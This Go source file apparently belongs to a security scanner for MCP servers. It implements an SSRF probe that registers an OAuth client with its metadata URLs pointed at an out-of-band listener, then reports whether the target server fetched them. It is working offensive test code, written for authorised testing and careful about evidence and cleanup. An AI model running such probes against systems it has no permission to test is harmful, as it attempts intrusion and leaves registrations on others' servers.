package mcp

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/calbebop/batesian/internal/attack"
	"github.com/calbebop/batesian/internal/oob"
)

// OAuthMetadataSSRFExecutor checks whether an MCP OAuth server fetches
// registrant-supplied URL metadata during dynamic client registration. A
// private-address destination is required for a confirmed SSRF finding.
type OAuthMetadataSSRFExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("mcp-oauth-metadata-ssrf", func(rc attack.RuleContext) attack.Executor {
		return NewOAuthMetadataSSRFExecutor(rc)
	})
}

func NewOAuthMetadataSSRFExecutor(r attack.RuleContext) *OAuthMetadataSSRFExecutor {
	return &OAuthMetadataSSRFExecutor{rule: r}
}

// urlMetadataFields are the RFC 7591 client-metadata fields whose values are
// URLs a server might fetch. Each is seeded with a distinct marker path so an
// OOB callback identifies which field was fetched.
var urlMetadataFields = []string{"jwks_uri", "sector_identifier_uri", "logo_uri", "client_uri", "policy_uri", "tos_uri"}

func (e *OAuthMetadataSSRFExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	client := attack.NewHTTPClient(opts, vars)

	registrationEndpoint, err := e.discoverRegistrationEndpoint(ctx, client, vars.BaseURL)
	if err != nil {
		return nil, err
	}
	if registrationEndpoint == "" {
		// The server advertises no OAuth DCR, which is not applicable rather than
		// clean only if the server answered at all.
		return nil, oauthNotApplicable(ctx, client, vars.BaseURL)
	}

	// Resolve the OOB listener (external if provided, else a local one).
	listenerURL := opts.OOBListenerURL
	var listener *oob.Listener
	if listenerURL == "" {
		if opts.DryRun {
			// A dry run must bind no socket; preview against a non-resolving
			// placeholder so the recorded plan still shows the seeded URLs.
			listenerURL = attack.DryRunOOBPlaceholderURL
		} else {
			listener = oob.New()
			var err error
			listenerURL, err = listener.Start()
			if err != nil {
				return nil, fmt.Errorf("oauth-metadata-ssrf: starting OOB listener: %w", err)
			}
			defer func() {
				stopCtx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
				defer cancel()
				_ = listener.Stop(stopCtx)
			}()
		}
	}

	// Build a registration whose URL metadata fields all target the OOB listener,
	// each with a field-specific marker path.
	clientName := "batesian-ssrf-" + vars.RandID
	body := map[string]interface{}{
		"client_name":    clientName,
		"redirect_uris":  []string{"https://batesian.invalid/callback"},
		"grant_types":    []string{"authorization_code"},
		"response_types": []string{"code"},
	}
	markerFor := map[string]string{}
	for _, field := range urlMetadataFields {
		marker := "/batesian-" + vars.RandID + "/" + field
		markerFor[marker] = field
		body[field] = listenerURL + marker
	}

	unauthClient := attack.NewUnauthHTTPClient(opts, vars)
	resp, err := unauthClient.POSTOAuth(ctx, registrationEndpoint, nil, body)
	if err != nil {
		return nil, fmt.Errorf("oauth-metadata-ssrf: DCR registration failed: %w", err)
	}
	accepted := resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated
	if !accepted && listener == nil {
		return nil, fmt.Errorf("%w: the registration at %s was refused with HTTP %d, so the "+
			"external OOB callback cannot be checked",
			attack.ErrInconclusive, registrationEndpoint, resp.StatusCode)
	}

	if listener == nil {
		// External OOB: we cannot observe the callback ourselves.
		cleanup := dcrCleanup{clientName: clientName, status: attack.CleanupNotAttempted,
			reason: "the external OOB callback may arrive after this scan"}
		recordDCRState(opts.TargetState, registrationEndpoint, clientName, resp, cleanup)
		return []attack.Finding{{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "info",
			Confidence: attack.RiskIndicator,
			Title:      "MCP OAuth DCR accepted metadata URLs (check your OOB server for a fetch)",
			Description: fmt.Sprintf("The registration endpoint at %s accepted a client registration whose URL "+
				"metadata fields pointed at %s. Check your OOB server for inbound requests to the marker paths to "+
				"confirm a server-side fetch. A callback alone does not prove access to private addresses.", registrationEndpoint, listenerURL),
			Evidence:    fmt.Sprintf("Registration endpoint: %s\nMarker base: %s\nFields seeded: %v\n%s", registrationEndpoint, listenerURL, urlMetadataFields, cleanup.evidenceLine()),
			Remediation: e.rule.Remediation,
			TargetURL:   registrationEndpoint,
		}}, nil
	}

	// Local OOB: wait for the server to fetch one of the seeded URLs.
	//
	// The registration IS the payload here, so the client cannot be removed until the
	// wait is over: deleting it first could cancel the very fetch this rule is
	// listening for, trading a real finding for a tidier target.
	cb, received := listener.WaitForMarker(ctx, 10*time.Second, "batesian-"+vars.RandID)
	cleanup := dcrCleanup{clientName: clientName, status: attack.CleanupUnavailable,
		reason: "registration was not accepted, so no client was confirmed"}
	if accepted {
		cleanup = deregisterDCRClient(ctx, unauthClient, registrationEndpoint, clientName, resp)
		recordDCRState(opts.TargetState, registrationEndpoint, clientName, resp, cleanup)
	}
	if !received {
		if !accepted {
			return nil, fmt.Errorf("%w: registration returned HTTP %d and no metadata callback was observed",
				attack.ErrInconclusive, resp.StatusCode)
		}
		return nil, fmt.Errorf("%w: no metadata callback observed; the listener may be unreachable or the fetch delayed",
			attack.ErrInconclusive)
	}
	field := matchMarker(cb.URL, markerFor)
	if field == "unknown" {
		return nil, fmt.Errorf("%w: the metadata callback did not match a seeded field", attack.ErrInconclusive)
	}
	severity := "info"
	confidence := attack.RiskIndicator
	title := "MCP OAuth server fetched a registrant-supplied metadata URL"
	impact := "The callback confirms a metadata fetch, not access to private addresses or response contents."
	if privateCallbackDestination(listenerURL) {
		severity = "high"
		confidence = attack.ConfirmedExploit
		title = "MCP OAuth server fetched a registrant-supplied private metadata URL"
		impact = "The callback confirms a request to this private address; it does not establish access to other private hosts or response contents."
	}
	return []attack.Finding{{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   severity,
		Confidence: confidence,
		Title:      title,
		Description: fmt.Sprintf("The OAuth server at %s fetched the registrant-supplied %s URL during dynamic "+
			"client registration. %s", registrationEndpoint, field, impact),
		Evidence: fmt.Sprintf("Registration endpoint: %s\nRegistration status: HTTP %d\nCallback destination: %s\nOOB callback: %s %s\nFetched field: %s\n%s",
			registrationEndpoint, resp.StatusCode, listenerURL, cb.Method, cb.URL, field, cleanup.evidenceLine()),
		Remediation: e.rule.Remediation,
		TargetURL:   registrationEndpoint,
	}}, nil
}

func privateCallbackDestination(raw string) bool {
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	ip := net.ParseIP(u.Hostname())
	return ip != nil && (ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast())
}

func (e *OAuthMetadataSSRFExecutor) discoverRegistrationEndpoint(ctx context.Context, client *attack.HTTPClient, baseURL string) (string, error) {
	fields, err := discoverOAuthFields(ctx, client, baseURL, "registration_endpoint")
	return fields["registration_endpoint"], err
}

// matchMarker returns the metadata field whose marker path is a prefix of the
// callback URL, or "unknown" if none matched.
func matchMarker(callbackURL string, markerFor map[string]string) string {
	for marker, field := range markerFor {
		if strings.Contains(callbackURL, marker) {
			return field
		}
	}
	return "unknown"
}
